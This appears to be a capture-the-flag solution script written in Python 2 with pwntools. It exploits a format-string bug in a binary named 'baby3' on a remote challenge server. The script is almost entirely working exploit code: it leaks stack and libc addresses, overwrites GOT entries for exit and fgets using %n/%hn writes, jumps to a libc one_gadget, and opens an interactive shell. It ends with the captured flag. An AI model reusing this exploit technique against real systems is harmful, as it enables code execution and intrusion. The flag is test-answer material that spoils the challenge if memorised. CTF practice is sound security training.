from pwn import *


binpath = './baby3'
context.binary = binpath
context.terminal = ['tmux', 'split-w', '-h']

elf = ELF(binpath)
libc = elf.libc
# libc = ELF('./libc.so.6')

gdbscript = '''
# b main
# b *0x4007b3
# just before printf
b *0x40083c
pwn
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
# io = process(binpath)
io = remote('baby-01.pwn.beer', 10003)

io.recvuntil('input: ')

addr_fini_array = elf.get_section_by_name('.fini_array').header.sh_addr

# base index = 6
payload = ''

payload += '%{}$lx..'.format((0x80 / 8) + 6) # stack
payload += '%{}$lx..'.format((0x80 / 8) + 6 + 3) # libc

diff = elf.symbols['main'] - len(payload)
payload += '%{}c%10$n..'.format(str(diff - 12)) # call main again
payload += p64(elf.got['exit'])

io.sendline(payload)

data = io.recvuntil('..').rstrip('.')
if 'Warning' in data:
    data = data[data.rfind('\n'):]

addr_stack = int(data, 16) - 0x1fea0
addr_libc = int(io.recvuntil('..').rstrip('.'), 16) - 0x21b97

print 'addr_stack = {}'.format(hex(addr_stack))
print 'addr_libc = {}'.format(hex(addr_libc))


io.recvuntil('input: ')

one_gadget = addr_libc + 0x10a38c
one_gadget = addr_libc + 0x4f322
# one_gadget = addr_libc + 0x4f2c5

payload = ''

index = 13
now = 0
for i in xrange(4):
    # target = u64(p64(addr_libc + libc.symbols['system'])[i*2:(i+1)*2].ljust(8, '\x00'))
    target = u64(p64(one_gadget)[i*2:(i+1)*2].ljust(8, '\x00'))
    l = (target - now - 1) % (2 << (8 * 2 - 1)) + 1
    payload += '%{}c%{}$hn'.format(l, index + i)
    now += l
payload += '....'

for i in xrange(4):
    payload += p64(elf.got['fgets'] + (i * 2))

io.sendline(payload)

io.interactive()


# sctf{F0rm4T_s7R1nG_bUgS_w3rE_st4TE_0F_7He_4rT_wh3N_sw0rDf15H_cAme_0u7}
